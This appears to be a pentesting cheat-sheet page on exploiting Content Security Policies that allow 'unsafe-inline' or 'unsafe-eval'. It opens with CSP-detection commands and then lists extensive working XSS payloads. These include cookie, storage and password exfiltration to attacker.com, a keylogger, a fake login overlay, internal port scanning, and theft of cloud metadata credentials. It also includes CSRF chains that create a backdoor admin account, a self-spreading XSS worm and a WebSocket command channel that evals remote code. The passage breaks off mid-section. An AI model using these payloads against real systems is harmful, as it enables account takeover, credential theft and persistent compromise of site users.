---
title: Unsafe Inline - Unsafe Eval
description: Unsafe-inline and unsafe-eval directives are present, covering injection techniques, payload crafting, eval chains, dynamic code execution, and filter evasion strategies.
navigation:
  icon: i-lucide-triangle-alert
  title: Unsafe Inline - Unsafe Eval
---

## Attack Theory

`'unsafe-inline'` and `'unsafe-eval'` are CSP directive values that fundamentally weaken Content Security Policy enforcement. When present in `script-src` or `default-src`, they re-enable the exact attack vectors CSP was designed to prevent — inline script execution and dynamic code evaluation.

::callout{icon="i-lucide-flame" color="red"}
**Core Principle:** `'unsafe-inline'` permits any inline `<script>` tag, event handler, and `javascript:` URI to execute. `'unsafe-eval'` permits `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`, and `new Function()`. Either directive alone collapses CSP's XSS protection model entirely.
::

### Directive Behavior Diagram

```text [CSP Directive Impact Map]
┌─────────────────────────────────────────────────────────────────────┐
│                    Content Security Policy                         │
│                                                                     │
│  script-src 'self'                                                  │
│  ├── Blocks: inline scripts ✅                                      │
│  ├── Blocks: eval() ✅                                              │
│  ├── Blocks: event handlers ✅                                      │
│  ├── Blocks: javascript: URIs ✅                                    │
│  └── Allows: same-origin <script src=""> only                      │
│                                                                     │
│  script-src 'self' 'unsafe-inline'                                  │
│  ├── Allows: <script>alert(1)</script> ⚠️                          │
│  ├── Allows: <div onclick="alert(1)"> ⚠️                           │
│  ├── Allows: <a href="javascript:alert(1)"> ⚠️                     │
│  ├── Allows: <style> injection (style-src) ⚠️                      │
│  ├── Blocks: eval() ✅                                              │
│  └── Blocks: Function() constructor ✅                              │
│                                                                     │
│  script-src 'self' 'unsafe-eval'                                    │
│  ├── Allows: eval("alert(1)") ⚠️                                   │
│  ├── Allows: new Function("alert(1)")() ⚠️                         │
│  ├── Allows: setTimeout("alert(1)", 0) ⚠️                          │
│  ├── Allows: setInterval("alert(1)", 0) ⚠️                         │
│  ├── Blocks: inline <script> ✅                                     │
│  ├── Blocks: event handlers ✅                                      │
│  └── Blocks: javascript: URIs ✅                                    │
│                                                                     │
│  script-src 'self' 'unsafe-inline' 'unsafe-eval'                    │
│  ├── Allows: ALL inline scripts ⚠️                                  │
│  ├── Allows: ALL event handlers ⚠️                                  │
│  ├── Allows: ALL javascript: URIs ⚠️                                │
│  ├── Allows: eval() and Function() ⚠️                               │
│  ├── Allows: setTimeout/setInterval with strings ⚠️                 │
│  └── CSP provides ZERO XSS protection 💀                            │
└─────────────────────────────────────────────────────────────────────┘
```

```text [Attack Decision Flow]
┌──────────────────────────────────┐
│  Extract CSP from target         │
└───────────────┬──────────────────┘
                │
                ▼
┌──────────────────────────────────┐
│  Check script-src / default-src  │
└───────────────┬──────────────────┘
                │
     ┌──────────┴──────────┐
     │                     │
     ▼                     ▼
┌──────────────┐   ┌───────────────┐
│unsafe-inline │   │ unsafe-eval   │
│  present?    │   │  present?     │
└──────┬───────┘   └──────┬────────┘
       │                  │
  ┌────┴────┐        ┌────┴────┐
  │YES      │NO      │YES      │NO
  ▼         ▼        ▼         ▼
┌────────┐ ┌──────┐ ┌────────┐ ┌──────────┐
│Inline  │ │Check │ │eval()  │ │Check     │
│Scripts │ │nonce │ │chains  │ │JSONP     │
│Event   │ │hash  │ │Function│ │Angular   │
│Handlers│ │strict│ │timeout │ │Other     │
│JS URIs │ │dynmic│ │interval│ │bypasses  │
└───┬────┘ └──────┘ └───┬────┘ └──────────┘
    │                    │
    ▼                    ▼
┌──────────────────────────────────┐
│  BOTH present?                   │
│  ┌─────────────────────────────┐ │
│  │ Full XSS — CSP is useless  │ │
│  │ Any standard XSS payload   │ │
│  │ works without restriction   │ │
│  └─────────────────────────────┘ │
└──────────────────────────────────┘
```

### What Each Directive Unlocks

::field-group

::field{name="unsafe-inline" type="critical"}
Permits execution of inline `<script>` blocks, inline event handlers (`onclick`, `onerror`, `onload`, etc.), `javascript:` URIs, and inline `<style>` blocks (if applied to `style-src`). Directly enables reflected and stored XSS through any HTML injection point.
::

::field{name="unsafe-eval" type="critical"}
Permits `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`, `setImmediate(string)`, and the WebAssembly compilation functions. Enables XSS when attacker controls string input to any of these sinks, even without inline script injection.
::

::field{name="Both Present" type="critical"}
CSP provides no meaningful XSS protection. Every standard XSS vector works. The policy is functionally equivalent to having no CSP at all for script execution.
::

::field{name="unsafe-hashes" type="high"}
Allows specific inline event handlers and javascript: URIs whose content matches a hash in the CSP. More restrictive than `unsafe-inline` but still exploitable if the hashed content is attacker-influenced.
::

::field{name="wasm-unsafe-eval" type="medium"}
Allows WebAssembly compilation (`WebAssembly.compile`, `WebAssembly.instantiate`) without enabling general `eval()`. Can be abused for code execution through crafted WASM modules.
::

::

---

## Phase 1 — Reconnaissance & Detection

### CSP Header Extraction

::tabs

:::tabs-item{icon="i-lucide-terminal" label="curl"}

```bash [Extract CSP Header]
# Basic extraction
curl -sI https://target.com | grep -i "content-security-policy"

# Follow redirects
curl -sIL https://target.com | grep -i "content-security-policy"

# Check both enforced and report-only
curl -sI https://target.com | grep -iE "content-security-policy(-report-only)?"

# Extract and parse directives
curl -sI https://target.com | grep -i "content-security-policy" | \
  sed 's/.*content-security-policy: //i' | tr ';' '\n' | sed 's/^ //'

# Check specifically for unsafe-inline and unsafe-eval
curl -sI https://target.com | grep -i "content-security-policy" | \
  grep -oP "'unsafe-inline'|'unsafe-eval'|'unsafe-hashes'|'wasm-unsafe-eval'"

# Multiple pages check
for path in / /login /dashboard /api /admin /search; do
  echo "=== $path ==="
  curl -sI "https://target.com$path" | grep -i content-security-policy | \
    grep -oP "'unsafe-inline'|'unsafe-eval'" | sort -u
done
```

:::

:::tabs-item{icon="i-lucide-terminal" label="httpie / wget / nmap"}

```bash [Alternative Tools]
# httpie
http --headers https://target.com | grep -i content-security-policy

# wget
wget --server-response --spider https://target.com 2>&1 | grep -i content-security-policy

# nmap
nmap -p 443 --script http-security-headers target.com
nmap -p 443 --script http-headers target.com | grep -iE "unsafe-inline|unsafe-eval"
```

:::

:::tabs-item{icon="i-lucide-globe" label="Browser Console"}

```javascript [Browser Detection]
// Extract full CSP
fetch(location.href).then(r => {
  let csp = r.headers.get('content-security-policy');
  let cspRO = r.headers.get('content-security-policy-report-only');
  console.log('CSP:', csp);
  console.log('CSP-RO:', cspRO);
  
  if (csp) {
    console.log('unsafe-inline:', csp.includes("'unsafe-inline'"));
    console.log('unsafe-eval:', csp.includes("'unsafe-eval'"));
  }
});

// Meta tag CSP
document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content

// Test eval availability directly
try { eval('1+1'); console.log('[+] eval() is ALLOWED'); }
catch(e) { console.log('[-] eval() is BLOCKED:', e.message); }

// Test inline script execution
try { new Function('return 1')(); console.log('[+] Function() is ALLOWED'); }
catch(e) { console.log('[-] Function() is BLOCKED:', e.message); }

// Test setTimeout with string
try { setTimeout('void(0)', 0); console.log('[+] setTimeout(string) ALLOWED'); }
catch(e) { console.log('[-] setTimeout(string) BLOCKED:', e.message); }
```

:::

::

### Meta Tag CSP Detection

```bash [Meta Tag Extraction]
# Extract CSP from meta tags
curl -s https://target.com | grep -oiP '<meta[^>]*http-equiv=["\x27]content-security-policy["\x27][^>]*content=["\x27]([^"\x27]*)["\x27]'

# Check if meta CSP contains unsafe directives
curl -s https://target.com | grep -oiP 'content-security-policy[^"]*"[^"]*"' | \
  grep -oP "'unsafe-inline'|'unsafe-eval'"

# Note: meta tag CSP cannot use report-uri or frame-ancestors
# Note: meta tag CSP can sometimes be injected/overridden if HTML injection exists
```

### Per-Page CSP Variation Detection

```bash [Page-by-Page Scan]
#!/bin/bash
# Some applications apply different CSPs to different endpoints
TARGET="https://target.com"
PATHS=(
  "/" "/login" "/register" "/dashboard" "/admin"
  "/api" "/api/v1" "/search" "/profile" "/settings"
  "/upload" "/contact" "/about" "/help" "/docs"
  "/static/test" "/assets/test" "/callback" "/oauth"
)

echo "[*] Scanning CSP across endpoints on $TARGET"
for path in "${PATHS[@]}"; do
  CSP=$(curl -sI "${TARGET}${path}" 2>/dev/null | grep -i "content-security-policy:" | head -1)
  if [ -n "$CSP" ]; then
    UNSAFE_INLINE=$(echo "$CSP" | grep -c "unsafe-inline")
    UNSAFE_EVAL=$(echo "$CSP" | grep -c "unsafe-eval")
    if [ "$UNSAFE_INLINE" -gt 0 ] || [ "$UNSAFE_EVAL" -gt 0 ]; then
      echo "[+] ${path}"
      [ "$UNSAFE_INLINE" -gt 0 ] && echo "    ⚠️  unsafe-inline PRESENT"
      [ "$UNSAFE_EVAL" -gt 0 ] && echo "    ⚠️  unsafe-eval PRESENT"
    else
      echo "[-] ${path} — no unsafe directives"
    fi
  else
    echo "[?] ${path} — no CSP header"
  fi
done
```

### Automated CSP Analysis

::code-group

```bash [csp-evaluator]
# Google CSP Evaluator
curl -s "https://csp-evaluator.withgoogle.com/getCSP" \
  -H "Content-Type: application/json" \
  -d "{\"csp\":\"script-src 'self' 'unsafe-inline' 'unsafe-eval'\"}"
```

```bash [cspscanner]
python3 cspscanner.py -u https://target.com
```

```bash [Security Headers Check]
# securityheaders.com API
curl -s "https://securityheaders.com/?q=https://target.com&followRedirects=on" | \
  grep -A5 "content-security-policy"
```

```bash [Custom One-Liner Analysis]
curl -sI https://target.com | grep -i "content-security-policy" | \
  awk -F': ' '{print $2}' | tr ';' '\n' | while read directive; do
    directive=$(echo "$directive" | sed 's/^ //')
    echo "$directive" | grep -q "unsafe-inline" && echo "⚠️  $directive"
    echo "$directive" | grep -q "unsafe-eval" && echo "⚠️  $directive"
    echo "$directive" | grep -qv "unsafe" && echo "✅ $directive"
  done
```

::

---

## Phase 2 — unsafe-inline Exploitation

### Injection Context Analysis

```text [unsafe-inline Attack Surface Map]
┌──────────────────────────────────────────────────────────────────┐
│           unsafe-inline Attack Vectors                           │
│                                                                  │
│  1. Inline <script> Tags                                         │
│     <script>alert(document.domain)</script>                      │
│     ✅ Allowed by unsafe-inline                                  │
│                                                                  │
│  2. Event Handler Attributes                                     │
│     <img src=x onerror="alert(1)">                               │
│     <body onload="alert(1)">                                     │
│     <div onmouseover="alert(1)">                                 │
│     ✅ Allowed by unsafe-inline                                  │
│                                                                  │
│  3. javascript: URIs                                             │
│     <a href="javascript:alert(1)">click</a>                     │
│     <iframe src="javascript:alert(1)">                           │
│     ✅ Allowed by unsafe-inline                                  │
│                                                                  │
│  4. Inline Style Injection (if style-src unsafe-inline)          │
│     <div style="background:url('javascript:alert(1)')">         │
│     ⚠️ Only in very old browsers                                │
│                                                                  │
│  5. SVG Inline Scripts                                           │
│     <svg onload="alert(1)">                                      │
│     <svg><script>alert(1)</script></svg>                         │
│     ✅ Allowed by unsafe-inline                                  │
│                                                                  │
│  6. Meta Refresh / Redirect                                      │
│     <meta http-equiv="refresh" content="0;url=javascript:...">  │
│     ⚠️ Browser-dependent                                        │
└──────────────────────────────────────────────────────────────────┘
```

### Inline Script Injection

::tabs

:::tabs-item{icon="i-lucide-code" label="Basic Inline Scripts"}

```html [Inline Script Payloads]
<!-- Basic alert PoC -->
<script>alert(document.domain)</script>

<!-- Multi-line script -->
<script>
  var data = document.cookie;
  fetch('https://attacker.com/steal?c=' + encodeURIComponent(data));
</script>

<!-- Self-closing (XHTML) -->
<script>alert(1)</script>

<!-- With type attribute -->
<script type="text/javascript">alert(1)</script>

<!-- Module type -->
<script type="module">alert(document.domain)</script>

<!-- Deferred execution -->
<script defer>alert(1)</script>

<!-- Async -->
<script async>alert(1)</script>

<!-- noscript bypass (content still parsed) -->
<noscript><script>alert(1)</script></noscript>

<!-- Template element (won't execute directly but useful for DOM clobbering) -->
<template><script>alert(1)</script></template>

<!-- Multiple scripts -->
<script>var x=1</script><script>alert(x)</script>
```

:::

:::tabs-item{icon="i-lucide-zap" label="Event Handlers"}

::code-collapse

```html [Event Handler Payloads]
<!-- Image error (most reliable, no user interaction) -->
<img src=x onerror="alert(1)">
<img src=x onerror=alert(1)>
<img/src=x onerror=alert(1)>
<img src=x onerror="alert(document.domain)">
<img src=x onerror="alert(document.cookie)">

<!-- SVG onload (fires automatically) -->
<svg onload="alert(1)">
<svg/onload=alert(1)>
<svg onload="alert(document.domain)">

<!-- Body onload -->
<body onload="alert(1)">
<body onpageshow="alert(1)">
<body onfocus="alert(1)" autofocus>

<!-- Input autofocus + onfocus -->
<input autofocus onfocus="alert(1)">
<input autofocus onfocus=alert(1)>
<textarea autofocus onfocus="alert(1)"></textarea>
<select autofocus onfocus="alert(1)"><option>x</option></select>
<keygen autofocus onfocus="alert(1)">
<button autofocus onfocus="alert(1)">x</button>

<!-- Details + ontoggle (auto-fires in some browsers) -->
<details open ontoggle="alert(1)">
<details/open/ontoggle=alert(1)>

<!-- Video/Audio error -->
<video src=x onerror="alert(1)">
<audio src=x onerror="alert(1)">
<source onerror="alert(1)">
<video><source onerror="alert(1)"></video>

<!-- Object/Embed error -->
<object data=x onerror="alert(1)">
<embed src=x onerror="alert(1)">

<!-- Marquee events -->
<marquee onstart="alert(1)">
<marquee onfinish="alert(1)" loop=1 width=0>x</marquee>
<marquee onbounce="alert(1)" loop=2 width=1>x</marquee>

<!-- Mouse events (require interaction) -->
<div onmouseover="alert(1)">hover me</div>
<div onmouseenter="alert(1)">hover me</div>
<div onmousemove="alert(1)">move over me</div>
<div onclick="alert(1)">click me</div>
<div ondblclick="alert(1)">double click me</div>
<div oncontextmenu="alert(1)">right click me</div>
<div onmousedown="alert(1)">click me</div>
<div onmouseup="alert(1)">click me</div>
<div onwheel="alert(1)">scroll over me</div>

<!-- Keyboard events -->
<input onkeypress="alert(1)" autofocus>
<input onkeydown="alert(1)" autofocus>
<input onkeyup="alert(1)" autofocus>

<!-- Form events -->
<form onsubmit="alert(1)"><input type=submit></form>
<form><button formaction="javascript:alert(1)">click</button></form>
<input onfocus="alert(1)" autofocus>
<input onblur="alert(1)" autofocus><input autofocus>
<input oninput="alert(1)" autofocus>
<input onchange="alert(1)" type="checkbox" checked onclick="this.checked=!this.checked">
<input oninvalid="alert(1)" required><input type=submit>
<input onselect="alert(1)" value="test" autofocus onfocus="this.select()">

<!-- Drag events -->
<div draggable="true" ondragstart="alert(1)">drag me</div>
<div ondrop="alert(1)" ondragover="event.preventDefault()">drop zone</div>

<!-- Clipboard events -->
<div oncopy="alert(1)">copy me</div>
<div oncut="alert(1)" contenteditable>cut me</div>
<div onpaste="alert(1)" contenteditable>paste here</div>

<!-- Touch events (mobile) -->
<div ontouchstart="alert(1)">touch me</div>
<div ontouchend="alert(1)">touch me</div>
<div ontouchmove="alert(1)">touch me</div>

<!-- Animation/Transition events -->
<div style="animation:x" onanimationstart="alert(1)">x</div>
<div style="animation:x" onanimationend="alert(1)">x</div>
<div style="transition:all" ontransitionend="alert(1)">x</div>

<!-- Pointer events -->
<div onpointerdown="alert(1)">click</div>
<div onpointerup="alert(1)">click</div>
<div onpointermove="alert(1)">move</div>
<div onpointerover="alert(1)">hover</div>

<!-- Focus/Blur variants -->
<div tabindex=0 onfocusin="alert(1)">focus</div>
<div tabindex=0 onfocusout="alert(1)">focus</div>

<!-- Scroll -->
<div onscroll="alert(1)" style="overflow:auto;height:50px"><div style="height:200px">scroll</div></div>

<!-- Resize (on window via iframe) -->
<iframe onresize="alert(1)" onload="this.style.width='100px'">

<!-- Error handlers for various elements -->
<link rel="stylesheet" href="x" onerror="alert(1)">
<script src="x" onerror="alert(1)"></script>

<!-- Media events -->
<video onloadstart="alert(1)"><source></video>
<video oncanplay="alert(1)"><source src="valid.mp4"></video>
```

::

:::

:::tabs-item{icon="i-lucide-link" label="javascript: URIs"}

```html [javascript: URI Payloads]
<!-- Anchor tag (requires click) -->
<a href="javascript:alert(1)">click me</a>
<a href="javascript:alert(document.domain)">click</a>
<a href="javascript:alert(document.cookie)">click</a>
<a href="javascript:void(fetch('https://attacker.com/?c='+document.cookie))">click</a>

<!-- Anchor with target -->
<a href="javascript:alert(1)" target="_blank">click</a>

<!-- iframe src -->
<iframe src="javascript:alert(1)"></iframe>
<iframe src="javascript:alert(document.domain)"></iframe>
<iframe src="javascript:fetch('https://attacker.com/?c='+parent.document.cookie)"></iframe>

<!-- object data -->
<object data="javascript:alert(1)">
<object data="javascript:alert(document.domain)">

<!-- embed src (browser-dependent) -->
<embed src="javascript:alert(1)">

<!-- form action -->
<form action="javascript:alert(1)"><input type=submit></form>
<form action="javascript:alert(1)"><button>submit</button></form>

<!-- button formaction -->
<form><button formaction="javascript:alert(1)">click</button></form>
<form><input type=submit formaction="javascript:alert(1)"></form>

<!-- base href (affects relative URLs) -->
<base href="javascript:alert(1)//">

<!-- SVG -->
<svg><a xlink:href="javascript:alert(1)"><text y=20>click</text></a></svg>

<!-- area href -->
<map name="m"><area href="javascript:alert(1)" shape="rect" coords="0,0,100,100"></map>
<img usemap="#m" src="valid.png" width=100 height=100>

<!-- meta refresh (browser-dependent) -->
<meta http-equiv="refresh" content="0;url=javascript:alert(1)">

<!-- Window.open via injection -->
<script>window.open('javascript:alert(1)')</script>
<img src=x onerror="window.open('javascript:alert(1)')">

<!-- Location assignment -->
<script>location='javascript:alert(1)'</script>
<img src=x onerror="location='javascript:alert(1)'">
<img src=x onerror="location.href='javascript:alert(1)'">

<!-- Encoded javascript: URI -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
<a href="jav&#x09;ascript:alert(1)">click</a>
<a href="jav&#x0A;ascript:alert(1)">click</a>
<a href="jav&#x0D;ascript:alert(1)">click</a>
```

:::

:::tabs-item{icon="i-lucide-image" label="SVG Vectors"}

```html [SVG-Based Payloads]
<!-- SVG onload -->
<svg onload="alert(1)">
<svg/onload=alert(1)>
<svg onload="alert(document.domain)">

<!-- SVG with embedded script -->
<svg><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>

<!-- SVG animate -->
<svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
<svg><animate onend="alert(1)" attributeName="x" dur="1ms" repeatCount="1">

<!-- SVG set -->
<svg><set onbegin="alert(1)" attributeName="x" to="1">

<!-- SVG foreignObject -->
<svg><foreignObject><body onload="alert(1)"></foreignObject></svg>
<svg><foreignObject><iframe src="javascript:alert(1)"></foreignObject></svg>

<!-- SVG use -->
<svg><use href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x">

<!-- SVG event handlers -->
<svg><rect width=100 height=100 onclick="alert(1)"/>
<svg><circle r=50 onmouseover="alert(1)"/>

<!-- SVG with xlink -->
<svg><a xlink:href="javascript:alert(1)"><circle r=50/></a></svg>

<!-- Inline SVG data URI -->
<img src="data:image/svg+xml,<svg onload=alert(1) xmlns='http://www.w3.org/2000/svg'>">

<!-- SVG as object -->
<object data="data:image/svg+xml,<svg onload=alert(1) xmlns='http://www.w3.org/2000/svg'>">
```

:::

::

### Data Exfiltration via unsafe-inline

::tabs

:::tabs-item{icon="i-lucide-cookie" label="Cookie Theft"}

```html [Cookie Exfiltration Methods]
<!-- fetch -->
<script>fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>

<!-- Image beacon -->
<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>

<!-- XMLHttpRequest -->
<script>
var x=new XMLHttpRequest();
x.open('GET','https://attacker.com/steal?c='+encodeURIComponent(document.cookie));
x.send();
</script>

<!-- Navigator.sendBeacon -->
<script>navigator.sendBeacon('https://attacker.com/steal',document.cookie)</script>

<!-- WebSocket -->
<script>
var ws=new WebSocket('wss://attacker.com/ws');
ws.onopen=function(){ws.send(document.cookie)};
</script>

<!-- Event handler variant -->
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
<svg onload="new Image().src='https://attacker.com/?c='+document.cookie">
<input autofocus onfocus="navigator.sendBeacon('https://attacker.com/s',document.cookie)">

<!-- DNS exfiltration -->
<script>
var c=document.cookie.replace(/[^a-zA-Z0-9]/g,'x');
new Image().src='https://'+c.substring(0,60)+'.attacker.com/dns';
</script>

<!-- Base64 encoded cookie -->
<script>fetch('https://attacker.com/s?d='+btoa(document.cookie))</script>
```

:::

:::tabs-item{icon="i-lucide-database" label="Storage & DOM"}

```html [Storage and DOM Exfiltration]
<!-- LocalStorage -->
<script>fetch('https://attacker.com/ls',{method:'POST',body:JSON.stringify(localStorage)})</script>

<!-- SessionStorage -->
<script>fetch('https://attacker.com/ss',{method:'POST',body:JSON.stringify(sessionStorage)})</script>

<!-- Full DOM -->
<script>fetch('https://attacker.com/dom',{method:'POST',body:document.documentElement.outerHTML})</script>

<!-- Form data extraction -->
<script>
var inputs=document.querySelectorAll('input,textarea,select');
var data={};
inputs.forEach(function(i){data[i.name||i.id]=i.value});
fetch('https://attacker.com/form',{method:'POST',body:JSON.stringify(data)});
</script>

<!-- CSRF token extraction -->
<script>
var token=document.querySelector('[name="csrf_token"],[name="_token"],[name="authenticity_token"],[name="csrfmiddlewaretoken"]');
if(token)fetch('https://attacker.com/csrf?t='+token.value);
</script>

<!-- All meta tags -->
<script>
var metas={};
document.querySelectorAll('meta').forEach(m=>{
  metas[m.getAttribute('name')||m.getAttribute('property')||m.getAttribute('http-equiv')]=m.content
});
fetch('https://attacker.com/meta',{method:'POST',body:JSON.stringify(metas)});
</script>

<!-- URL, referrer, title -->
<script>
fetch('https://attacker.com/info?'+new URLSearchParams({
  url:location.href,
  ref:document.referrer,
  title:document.title,
  origin:location.origin
}));
</script>
```

:::

:::tabs-item{icon="i-lucide-key" label="Credential Harvesting"}

```html [Credential Harvesting Payloads]
<!-- Keylogger -->
<script>
var keys='';
document.addEventListener('keypress',function(e){
  keys+=e.key;
  if(keys.length>20){
    navigator.sendBeacon('https://attacker.com/keys',keys);
    keys='';
  }
});
</script>

<!-- Form submission interceptor -->
<script>
document.addEventListener('submit',function(e){
  var fd=new FormData(e.target);
  var data={};
  fd.forEach(function(v,k){data[k]=v});
  navigator.sendBeacon('https://attacker.com/form',JSON.stringify(data));
},true);
</script>

<!-- Password field sniffer -->
<script>
setInterval(function(){
  var pw=document.querySelectorAll('input[type=password]');
  pw.forEach(function(p){
    if(p.value && p.value.length>0){
      fetch('https://attacker.com/pw?v='+encodeURIComponent(p.value)+'&u='+encodeURIComponent(document.querySelector('input[type=email],input[type=text],input[name=username]')?.value));
    }
  });
},2000);
</script>

<!-- Fake login form overlay -->
<script>
document.body.innerHTML='<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#fff"><form action="https://attacker.com/creds" method=POST style="width:300px"><h2>Session Expired</h2><input name=user placeholder="Username" style="width:100%;padding:8px;margin:4px 0"><input name=pass type=password placeholder="Password" style="width:100%;padding:8px;margin:4px 0"><button style="width:100%;padding:8px;margin:4px 0">Login</button></form></div>';
</script>

<!-- Clipboard hijack -->
<script>
document.addEventListener('copy',function(e){
  var sel=window.getSelection().toString();
  navigator.sendBeacon('https://attacker.com/clip',sel);
});
</script>

<!-- Auto-fill credential extraction -->
<script>
setTimeout(function(){
  var inputs=document.querySelectorAll('input[autocomplete]');
  inputs.forEach(function(i){
    if(i.value)fetch('https://attacker.com/auto?'+i.name+'='+encodeURIComponent(i.value));
  });
},3000);
</script>
```

:::

:::tabs-item{icon="i-lucide-globe" label="Internal Network Scan"}

```html [Internal Network Scanning]
<!-- Port scan via fetch timing -->
<script>
async function scanPort(host,port){
  let start=Date.now();
  try{
    await fetch('http://'+host+':'+port,{mode:'no-cors',signal:AbortSignal.timeout(1000)});
    return{host,port,time:Date.now()-start,status:'open'};
  }catch(e){
    return{host,port,time:Date.now()-start,status:Date.now()-start<1000?'open':'closed'};
  }
}

async function scan(){
  let results=[];
  let hosts=['127.0.0.1','192.168.1.1','10.0.0.1','172.16.0.1'];
  let ports=[22,80,443,3000,3306,5432,6379,8080,8443,9200];
  
  for(let h of hosts){
    for(let p of ports){
      let r=await scanPort(h,p);
      if(r.status==='open')results.push(r);
    }
  }
  fetch('https://attacker.com/scan',{method:'POST',body:JSON.stringify(results)});
}
scan();
</script>

<!-- Internal service detection -->
<script>
['http://localhost:3000','http://localhost:8080','http://127.0.0.1:9200',
 'http://192.168.1.1','http://10.0.0.1:8500','http://metadata.google.internal/computeMetadata/v1/'].forEach(function(url){
  fetch(url,{mode:'no-cors'}).then(function(){
    fetch('https://attacker.com/alive?u='+encodeURIComponent(url));
  }).catch(function(){});
});
</script>

<!-- Cloud metadata SSRF via XSS -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r=>r.text())
  .then(role=>{
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role.trim())
      .then(r=>r.text())
      .then(creds=>fetch('https://attacker.com/aws',{method:'POST',body:creds}))
  });
</script>
```

:::

::

### CSRF via unsafe-inline

```html [CSRF Attack Chains]
<!-- Simple state-changing request -->
<script>
fetch('/api/user/email',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'email=attacker@evil.com'
});
</script>

<!-- With CSRF token extraction first -->
<script>
fetch('/settings',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    var m=html.match(/csrf[_-]?token[^'"]*['"]([^'"]+)/i);
    if(m){
      fetch('/settings/password',{
        method:'POST',
        credentials:'include',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'password=hacked123&confirm=hacked123&csrf_token='+m[1]
      });
    }
  });
</script>

<!-- Admin user creation -->
<script>
fetch('/admin',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    var token=html.match(/token.*?value=['"]([^'"]+)/i);
    fetch('/admin/users',{
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({
        username:'backdoor',
        password:'P@ssw0rd!',
        role:'admin',
        _token:token?token[1]:''
      })
    });
  });
</script>

<!-- API key generation -->
<script>
fetch('/api/keys/generate',{
  method:'POST',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:'{}'
}).then(r=>r.json()).then(d=>fetch('https://attacker.com/key?k='+d.api_key));
</script>
```

### Persistent Backdoor Injection

```html [Persistence Payloads]
<!-- Service Worker registration for persistent access -->
<script>
if('serviceWorker' in navigator){
  navigator.serviceWorker.register('/sw.js',{scope:'/'})
    .then(()=>fetch('https://attacker.com/sw?status=registered'));
}
</script>

<!-- Inject into stored content (comments, profiles, etc.) -->
<script>
// Self-propagating XSS worm
fetch('/api/profile',{
  method:'PUT',
  credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({
    bio:'<script>fetch("https://attacker.com/worm?c="+document.cookie)<\/script>'
  })
});
</script>

<!-- WebSocket persistent C2 channel -->
<script>
(function connect(){
  var ws=new WebSocket('wss://attacker.com/c2');
  ws.onmessage=function(e){eval(e.data)};
  ws.onclose=function(){setTimeout(connect,5000)};
})();
</script>

<!-- LocalStorage persistence -->
<script>
if(!localStorage.getItem('x')){
  localStorage.setItem('x','1');
  // First run - exfil everything
  fetch('https://attacker.com/first',{
    method:'POST',
    body:JSON.stringify({
      cookies:document.cookie,
      ls:JSON.stringify(localStorage),
      url:location.href
    })
  });
}
</script>
```

---

## Phase 3 — unsafe-eval Exploitation

### Eval Sink Analysis

```text [unsafe-eval Execution Sinks]
┌──────────────────────────────────────────────────────────────┐
│                 unsafe-eval Execution Sinks                  │
│                                                              │
│  Direct Evaluation                                           │
│  ├── eval("alert(1)")                                        │
│  ├── eval('alert(document.domain)')                          │
│  └── eval(userInput)  ← attacker-controlled string           │
│                                                              │
│  Function Constructor                                        │
│  ├── new Function("alert(1)")()                              │
│  ├── Function("return alert(1)")()                           │
│  ├── [].constructor.constructor("alert(1)")()                │
│  └── "".constructor.constructor("alert(1)")()                │
│                                                              │
│  Timer Functions (string argument)                           │
│  ├── setTimeout("alert(1)", 0)                               │
│  ├── setInterval("alert(1)", 0)                              │
│  └── setImmediate("alert(1)")  ← IE/Edge Legacy             │
│                                                              │
│  Indirect eval                                               │
│  ├── window.eval("alert(1)")                                 │
│  ├── [eval][0]("alert(1)")                                   │
│  ├── (0,eval)("alert(1)")                                    │
│  └── var e=eval; e("alert(1)")                               │
│                                                              │
│  JavaScript Protocol (eval context)                          │
│  ├── location="javascript:eval('alert(1)')"                  │
│  └── window.open("javascript:eval('alert(1)')")              │
│                                                              │
│  Dynamic Import (module context)                             │
│  └── import('data:text/javascript,alert(1)')                 │
│                                                              │
│  Template Literal Tags                                       │
│  └── eval`alert(1)`  ← tagged template                      │
│                                                              │
│  JSON.parse with reviver                                     │
│  └── JSON.parse('{"a":1}', (k,v) => eval(v))                │
│                                                              │
│  Reflect / Proxy                                             │
│  ├── Reflect.apply(eval, null, ["alert(1)"])                 │
│  └── Proxy-based eval wrappers                               │
└──────────────────────────────────────────────────────────────┘
```

### Finding eval Sinks in Application Code

::tabs

:::tabs-item{icon="i-lucide-search" label="Source Review"}

```bash [Sink Discovery Commands]
# Download all JavaScript files from target
wget -r -l1 -nd -A "*.js" https://target.com/ -P ./js_files/

# Search for eval sinks
grep -rn "eval(" ./js_files/ | grep -v "node_modules"
grep -rn "new Function(" ./js_files/
grep -rn "setTimeout(" ./js_files/ | grep -E "setTimeout\s*\(\s*['\"]"
grep -rn "setInterval(" ./js_files/ | grep -E "setInterval\s*\(\s*['\"]"
grep -rn "\.innerHTML" ./js_files/
grep -rn "document\.write" ./js_files/
grep -rn "\.insertAdjacentHTML" ./js_files/

# Search for user input flowing to eval
grep -rn "eval.*\(.*param\|query\|input\|data\|user\|value\|search\|url\|hash\|fragment" ./js_files/

# Search for JSON.parse with reviver
